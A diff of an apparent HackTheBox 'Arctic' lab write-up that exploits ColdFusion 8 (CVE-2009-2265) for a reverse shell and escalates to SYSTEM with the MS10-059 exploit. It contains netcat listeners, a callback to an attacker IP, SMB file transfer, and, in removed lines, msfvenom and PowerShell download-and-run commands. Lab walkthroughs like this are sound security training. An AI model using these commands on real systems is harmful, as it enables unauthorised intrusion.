@@ -51,13 +51,13 @@ It seems that there is a weird port `8500` open. Lets check it in our browser.
 
 ![Port8500_3.png](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Arctic/Port8500_3.png?raw=true)
 
-There's an interesting folder named `administrator` which presented us a login page for ColdFusion 8.
+There's an interesting folder named `administrator` which presented us a ColdFusion 8 login page.
 
 ![Admin.png](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Arctic/Admin.png?raw=true)
 
 # Vulnerabilities
 
-Since we know that the website is using ColdFusion 8, we should search up some vulnerabilities on it.
+Since we know that the website is using ColdFusion 8, we should search up some vulnerabilities on it using `searchsploit`.
 
 ```bash
 ┌──(root💀Shiro)-[/home/shiro/HackTheBox/Arctic]
@@ -74,16 +74,11 @@ ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)               
 ...
 ```
 
-The only exploits that we are interested in is the `ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)` exploit. Googling this exploit brings us to this [page](https://www.exploit-db.com/exploits/16788)
-Since we know what the CVE is, lets Google for an exploit which brings us to this [page](https://github.com/zaphoxx/zaphoxx-coldfusion).
-Follow the instructions stated on the GitHub page.
+The exploit that we are interested in is the `ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)` exploit. 
+
+The vulnerability is [CVE-2009-2265](https://www.exploit-db.com/exploits/16788) and there is an exploit on this GitHub [repo](https://github.com/zaphoxx/zaphoxx-coldfusion).
 
 ```bash
-Usage is pretty simple:
-Make sure you have a payload file created
-e.g. using msfvenom: msfvenom -p java/jsp_shell_reverse_tcp -f raw LHOST=<yourip> LPORT=<yourport> -o shell.jsp
-usage: python3 2265.py [-h] -t TARGET [-p PORT] [-f FILEPATH] [-b BASEPATH]
-
 ┌──(root💀Shiro)-[/home/shiro/HackTheBox/Arctic]
 └─# python3 2265.py -t 10.10.10.11 -p 8500 -f shell.jsp
 [info] Using following settings:
@@ -97,7 +92,6 @@ basepath  :
 [+] Goto '/userfiles/file/TKVC4S.jsp' to trigger the payload!
 [info] Make sure you have a listener active
 [info] (e.g. nc -lvp 4444) before triggering the payload
-<press any key>
 ```
 
 After we have successfully run the script, we can `curl` the website to trigger the payload - remember to setup a netcat listener first!
@@ -108,27 +102,16 @@ After we have successfully run the script, we can `curl` the website to trigger 
 ```
 
 ```bash
-Netcat listener:
 ┌──(shiro㉿Shiro)-[~]
 └─$ nc -nlvp 1234
-Ncat: Version 7.91 ( https://nmap.org/ncat )
-Ncat: Listening on :::1234
-Ncat: Listening on 0.0.0.0:1234
-Ncat: Connection from 10.10.10.11.
-Ncat: Connection from 10.10.10.11:49264.
-Microsoft Windows [Version 6.1.7600]
-Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+...
 
 C:\ColdFusion8\runtime\bin>whoami
-whoami
 arctic\tolis
 
 C:\Users\tolis\Desktop>type user.txt
-type user.txt
 02650d3a69a70780c302e146a6cb96f3
 ```
-
-Nice! We obtained the user flag. Now, we have to find a way to escalate our privilege.
 
 # Privilege Escalation
 
@@ -174,86 +157,9 @@ Network Card(s):           1 NIC(s) Installed.
                                  DHCP Enabled:    No
                                  IP address(es)
                                  [01]: 10.10.10.11
-
-C:\ColdFusion8\runtime\bin>powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.4:8000/Sherlock.ps1') ; Find-AllVulns"
-
-Title      : User Mode to Ring (KiTrap0D)
-MSBulletin : MS10-015
-CVEID      : 2010-0232
-Link       : https://www.exploit-db.com/exploits/11199/
-VulnStatus : Not supported on 64-bit systems
-
-Title      : Task Scheduler .XML
-MSBulletin : MS10-092
-CVEID      : 2010-3338, 2010-3888
-Link       : https://www.exploit-db.com/exploits/19930/
-VulnStatus : Appears Vulnerable
-
-Title      : NTUserMessageCall Win32k Kernel Pool Overflow
-MSBulletin : MS13-053
-CVEID      : 2013-1300
-Link       : https://www.exploit-db.com/exploits/33213/
-VulnStatus : Not supported on 64-bit systems
-
-Title      : TrackPopupMenuEx Win32k NULL Page
-MSBulletin : MS13-081
-CVEID      : 2013-3881
-Link       : https://www.exploit-db.com/exploits/31576/
-VulnStatus : Not supported on 64-bit systems
-
-Title      : TrackPopupMenu Win32k Null Pointer Dereference
-MSBulletin : MS14-058
-CVEID      : 2014-4113
-Link       : https://www.exploit-db.com/exploits/35101/
-VulnStatus : Not Vulnerable
-
-Title      : ClientCopyImage Win32k
-MSBulletin : MS15-051
-CVEID      : 2015-1701, 2015-2433
-Link       : https://www.exploit-db.com/exploits/37367/
-VulnStatus : Appears Vulnerable
-
-Title      : Font Driver Buffer Overflow
-MSBulletin : MS15-078
-CVEID      : 2015-2426, 2015-2433
-Link       : https://www.exploit-db.com/exploits/38222/
-VulnStatus : Not Vulnerable
-
-Title      : 'mrxdav.sys' WebDAV
-MSBulletin : MS16-016
-CVEID      : 2016-0051
-Link       : https://www.exploit-db.com/exploits/40085/
-VulnStatus : Not supported on 64-bit systems
-
-Title      : Secondary Logon Handle
-MSBulletin : MS16-032
-CVEID      : 2016-0099
-Link       : https://www.exploit-db.com/exploits/39719/
-VulnStatus : Appears Vulnerable
-
-Title      : Windows Kernel-Mode Drivers EoP
-MSBulletin : MS16-034
-CVEID      : 2016-0093/94/95/96
-Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1
-             6-034?
-VulnStatus : Not Vulnerable
-
-Title      : Win32k Elevation of Privilege
-MSBulletin : MS16-135
-CVEID      : 2016-7255
-Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S
-             ample-Exploits/MS16-135
-VulnStatus : Not Vulnerable
-
-Title      : Nessus Agent 6.6.2 - 6.10.3
-MSBulletin : N/A
-CVEID      : 2017-7199
-Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h
-             tml
-VulnStatus : Not Vulnerable
 ```
 
-Since we have a lack of information on the possible exploits, Let's copy the `systeminfo` into a `txt` file and use Windows-Exploit-Suggester to help us.
+Copy this `systeminfo` into a `txt` file and use Windows-Exploit-Suggester for help.
 
 ```bash
 ┌──(root💀Shiro)-[/home/shiro/HackTheBox/Arctic]
@@ -261,66 +167,32 @@ Since we have a lack of information on the possible exploits, Let's copy the `sy
 
 ┌──(root💀Shiro)-[/home/shiro/HackTheBox/Arctic]
 └─# Windows-Exploit-Suggester/windows-exploit-suggester.py --update
-[*] initiating winsploit version 3.3...
-[+] writing to file 2021-05-23-mssb.xls
-[*] done
 
 ┌──(root💀Shiro)-[/home/shiro/HackTheBox/Arctic]
 └─# Windows-Exploit-Suggester/windows-exploit-suggester.py --database 2021-05-23-mssb.xls --systeminfo sysinfo.txt
-[*] initiating winsploit version 3.3...
-[*] database file detected as xls or xlsx based on extension
-[*] attempting to read from the systeminfo input file
-[+] systeminfo input file read successfully (utf-8)
-[*] querying database file for potential vulnerabilities
-[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
-[*] there are now 197 remaining vulns
-[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
-[+] windows version identified as 'Windows 2008 R2 64-bit'
-[*]
 ...
 [E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
-[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
-[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
-[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
+...
 [*] done
 ```
 
-MS10-059 sounds interesting (because we want to escalate our privilege). Here is the Github [link](https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059:%20Chimichurri/Compiled/Chimichurri.exe).
-
-Let's open a smb server to share the exploit downloaded.
+MS10-059 sounds interesting because we want to escalate our privilege. The exploit can be found [here](https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059:%20Chimichurri/Compiled/Chimichurri.exe). Let's open a smb server to share the exploit.
 
 ```bash
 ┌──(root💀Shiro)-[/home/shiro/HackTheBox/Arctic]
 └─# python3 /opt/impacket/examples/smbserver.py share .
 ```
 
-Then, we copy the exploit over to our user shell.
-
 ```powershell
 C:\ColdFusion8\runtime\bin>net use \\10.10.14.4\share
-
 C:\ColdFusion8\runtime\bin>copy \\10.10.14.4\share\Chimichurri.exe
-```
-
-Now that we have our exploit ready, let's start another netcat listener and run the exploit!
-
-```powershell
 C:\ColdFusion8\runtime\bin>.\Chimichurri.exe 10.10.14.4 443
-.\Chimichurri.exe 10.10.14.4 443
-/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>
 ```
+
 ```powershell
-Netcat listener
 ┌──(root💀Shiro)-[/home/shiro/HackTheBox/Arctic]
 └─# nc -nvlp 443
-Ncat: Version 7.91 ( https://nmap.org/ncat )
-Ncat: Listening on :::443
-Ncat: Listening on 0.0.0.0:443
-Ncat: Connection from 10.10.10.11.
-Ncat: Connection from 10.10.10.11:49297.
-Microsoft Windows [Version 6.1.7600]
-Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
-
+...
 C:\ColdFusion8\runtime\bin>whoami
 nt authority\system
 
